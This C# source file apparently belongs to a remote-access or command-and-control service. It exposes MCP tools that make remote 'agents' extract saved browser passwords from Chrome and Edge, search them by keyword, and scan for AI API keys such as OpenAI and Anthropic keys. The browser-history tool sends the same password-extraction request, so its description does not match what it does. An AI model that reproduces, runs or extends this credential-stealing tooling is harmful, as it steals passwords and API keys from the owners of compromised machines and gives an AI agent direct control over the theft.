using System.ComponentModel;
using ModelContextProtocol.Server;
using LibraNextgen.Service.Services;

namespace LibraNextgen.Service.Mcp;

[McpServerToolType]
public sealed class DataTools
{
    [McpServerTool, Description("Extract saved passwords from browsers on an agent (with optional keyword search)")]
    public static async Task<string> get_browser_passwords(
        RelayService relay,
        AgentService agents,
        [Description("Target agent ID")] string agentId,
        [Description("Browser: chrome, edge, or all (default all)")] string browser = "all",
        [Description("Search keyword (optional; enables search mode)")] string? keyword = null,
        [Description("Offset for pagination (default 0)")] int offset = 0,
        [Description("Limit for pagination (default 100)")] int limit = 100)
    {
        if (!string.IsNullOrEmpty(keyword))
            return await McpUtils.RelayOrError(relay, agents, agentId, "creds",
                new { op = "browser_search", type = browser, keyword }, TimeSpan.FromSeconds(60));
        return await McpUtils.RelayOrError(relay, agents, agentId, "creds",
            new { op = "browser", type = browser, offset, limit }, TimeSpan.FromSeconds(60));
    }

    [McpServerTool, Description("Extract browser history from an agent (with optional keyword search)")]
    public static async Task<string> get_browser_history(
        RelayService relay,
        AgentService agents,
        [Description("Target agent ID")] string agentId,
        [Description("Browser: chrome, edge, or all (default all)")] string browser = "all",
        [Description("Search keyword (optional; enables search mode)")] string? keyword = null,
        [Description("Offset for pagination (default 0)")] int offset = 0,
        [Description("Limit for pagination (default 100)")] int limit = 100)
    {
        if (!string.IsNullOrEmpty(keyword))
            return await McpUtils.RelayOrError(relay, agents, agentId, "creds",
                new { op = "browser_search", type = browser, keyword }, TimeSpan.FromSeconds(60));
        return await McpUtils.RelayOrError(relay, agents, agentId, "creds",
            new { op = "browser", type = browser, offset, limit }, TimeSpan.FromSeconds(60));
    }

    [McpServerTool, Description("Scan for AI API keys (OpenAI, Anthropic, etc.) on an agent")]
    public static async Task<string> scan_ai_tokens(
        RelayService relay,
        AgentService agents,
        [Description("Target agent ID")] string agentId)
    {
        return await McpUtils.RelayOrError(relay, agents, agentId, "creds",
            new { op = "ai" }, TimeSpan.FromSeconds(60));
    }
}
